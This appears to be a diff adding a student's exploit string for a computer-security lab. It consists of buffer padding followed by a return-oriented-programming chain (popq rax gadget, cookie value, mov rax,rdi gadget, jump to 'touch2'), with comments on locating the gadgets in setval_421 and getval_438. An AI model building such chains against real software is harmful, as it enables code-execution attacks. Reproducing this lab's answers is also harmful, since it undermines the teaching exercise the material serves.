@@ -1,0 +1,19 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+a1 18 40 00 00 00 00 00  /* goes to this address, popped off first */
+8e a5 36 5b 00 00 00 00  /* gadget - value of cookie, popq rax */
+87 18 40 00 00 00 00 00  /* gadget - mov rax, rdi */
+1e 17 40 00 00 00 00 00  /* last address is touch2 */
+
+
+/* setval_421 */
+/* 40189f:	c7 07 58 90 90 c3 */
+/* go from 58 so 4018a1 */
+
+/* getval_438 */
+/* 401886:	b8 48 89 c7 90 */
+/* go from 48 so 401887 */
